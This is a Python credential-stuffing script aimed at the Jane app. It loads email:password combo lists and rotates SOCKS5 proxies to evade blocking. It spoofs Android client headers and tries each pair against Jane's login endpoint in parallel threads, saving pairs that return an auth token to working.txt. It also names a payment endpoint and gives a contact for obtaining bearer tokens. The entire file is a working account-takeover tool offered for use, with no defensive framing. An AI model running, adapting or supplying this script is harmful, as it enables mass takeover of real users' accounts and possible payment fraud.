import requests
import json
import uuid
import random
from multiprocessing import Pool # Multi-Threading
from multiprocessing import freeze_support # Windows Support

requests.packages.urllib3.disable_warnings()

accounts = [line.rstrip('\n') for line in open("combo.txt", 'r')]
proxies = [line.rstrip('\n') for line in open("proxies.txt", 'r')]

LOGIN_ENDPOINT="https://login.jane.com/login"
PAYMENT_ENDPOINT="https://paymentsv2.jane.com/customer"

DEFAULT_BEARER="generate one in-app or email miyako@miyako.rocks and I can generate one for you."

def generateHeaders(authorization, deviceId=None, sessionId=None):
    return {
        "accept-encoding": "gzip",
        "authorization": f"Bearer {authorization}",
        "cache-control": "public, max-age=0",
        "connection": "Keep-Alive",
        "content-length": "62",
        "content-type": "application/json; charset=UTF-8",
        "host": "login.jane.com",
        "user-agent": "JaneAndroidInstalled/5.1.2 (Android; 7.1.2; samsung; samsung; SM-G977N)",
        "x-jane-app-name": "jane-android",
        "x-jane-app-version": "5.1.2",
        "x-jane-device-id": deviceId,
        "x-jane-session-id": sessionId,
        "x-jane-timezon-offset": "-300"
    }

def generateSocks5ProxyUrl(ip, port, username=None, password=None):
    if(username and password):
        return {
            'http': f"socks5://{username}:{password}@{ip}:{port}",
            'https': f"socks5://{username}:{password}@{ip}:{port}"
        }
    else:
        return {
            'http': f"socks5://{ip}:{port}",
            'https': f"socks5://{ip}:{port}"
        }

def generateLoginPayload(email, password):
    return {
        "email": email,
        "password": password
    }

def checkAccount(account):
    global proxies
    proxy = random.choice(proxies)
    if len(proxy.split(':')) == 2:
        ip, port, = proxy.split(':')
        username = None
        password = None
    if len(proxy.split(':')) == 4:
        ip, port, username, password = proxy.split(':')
    userEmail, userPassword = account.split(':')
    proxyUrl = generateSocks5ProxyUrl(ip, port, username, password)
    try:
        sessionId = str(uuid.uuid4())
        deviceId = str(uuid.uuid4())
        response = requests.post(LOGIN_ENDPOINT, proxies=proxyUrl, headers=generateHeaders(DEFAULT_BEARER, deviceId, sessionId), data=json.dumps(generateLoginPayload(userEmail, userPassword)))
        if('janeAuth' in response.text):
            responseJson = response.json()
            janeAuth = responseJson['janeAuth']
            print(f'[Good Account] {account} - {janeAuth}')
            with open('working.txt', 'a') as f:
                f.write(account + "\n")
                f.close()
        else:
            print(f'[Bad Account] {account}')
    except Exception as e:
        print(f'[Checking Failed ({e}) {account}]')
        proxies.remove(proxy)

def main():
    numThreads = input("How many threads would you like to use? ")
    freeze_support()

    pool = Pool(int(numThreads))
    pool.map(checkAccount, accounts)

    pool.close()
    pool.join()

if __name__ == "__main__":
    main()